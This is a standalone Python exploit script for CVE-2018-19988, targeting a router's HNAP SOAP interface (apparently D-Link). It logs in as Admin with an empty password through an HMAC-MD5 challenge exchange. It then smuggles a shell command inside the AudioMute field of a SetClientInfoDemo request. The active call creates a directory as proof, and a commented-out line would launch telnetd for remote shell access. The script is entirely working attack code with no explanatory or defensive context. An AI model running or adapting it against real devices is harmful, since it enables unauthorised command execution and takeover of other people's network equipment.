# coding:utf-8
import requests
import telnetlib
from hashlib import md5
import time
import math
import sys

trans_5C = "".join(chr(x ^ 0x5c) for x in range(256))
trans_36 = "".join(chr(x ^ 0x36) for x in range(256))
blocksize = md5().block_size

def hmac_md5(key, msg):
    if len(key) > blocksize:
        key = md5(key).digest()
    key += chr(0) * (blocksize - len(key))
    o_key_pad = key.translate(trans_5C).encode("utf-8")
    i_key_pad = key.translate(trans_36).encode("utf-8")
    msg = msg.encode("utf-8")
    return md5(o_key_pad + md5(i_key_pad + msg).digest())

def HNAP_AUTH(SOAPAction, privateKey):
    b = math.floor(int(time.time())) % 2000000000
    b = str(b)[:-2]
    h = hmac_md5(privateKey, b + '"http://purenetworks.com/HNAP1/' + SOAPAction + '"').hexdigest().upper()
    return h + " " + b

IP = sys.argv[1]
adminPw = ''


def Attack_Code(command):
    headers = requests.utils.default_headers()
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
    headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/Login"'
    headers["Origin"] = "http://" + IP
    headers["Referer"] = "http://" + IP + "/info/Login.html"
    headers["Content-Type"] = "text/xml; charset=UTF-8"
    headers["X-Requested-With"] = "XMLHttpRequest"

    payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
    r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
    data = r.text

    challenge = str(data[data.find("<Challenge>") + 11: data.find("</Challenge>")])
    cookie = data[data.find("<Cookie>") + 8: data.find("</Cookie>")]
    publicKey = str(data[data.find("<PublicKey>") + 11: data.find("</PublicKey>")])
    privateKey = hmac_md5(publicKey + adminPw, challenge).hexdigest().upper()
    password = hmac_md5(privateKey, challenge).hexdigest().upper()


    headers["HNAP_AUTH"] = HNAP_AUTH("Login", privateKey)
    headers["Cookie"] = "uid=" + cookie
    payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username>Admin</Username><LoginPassword>'+password+'</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
    r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)


    headers["Origin"] = "http://" + IP
    headers["HNAP_AUTH"] = HNAP_AUTH("SetClientInfoDemo", privateKey)
    headers["SOAPaction"] = '"http://purenetworks.com/HNAP1/SetClientInfoDemo"'
    headers["Accept"] = "text/xml"


    payload_mkdir = '<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>\
    <SetClientInfoDemo> <ClientInfoLists> <ClientInfo>\
    <MacAddress>11:22:33:44:55:66</MacAddress>\
    <NickName>default</NickName>\
    <ReserveIP>192.168.0.1</ReserveIP> <SupportedAction>\
    <AudioMute>'+command+'</AudioMute>\
    <AudioEnable>default</AudioEnable>\
    <SmartPlugEnable>default</SmartPlugEnable>\
    <ZWaveSmartPlug>default</ZWaveSmartPlug> </SupportedAction>\
    </ClientInfo> </ClientInfoLists>\
    </SetClientInfoDemo>\
    </soap:Body> </soap:Envelope>'

    r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload_mkdir)
    print(r.text);

    time.sleep(1)


Attack_Code("'`mkdir CVE-2018-19988`'")
#Attack_Code("'`telnetd`'")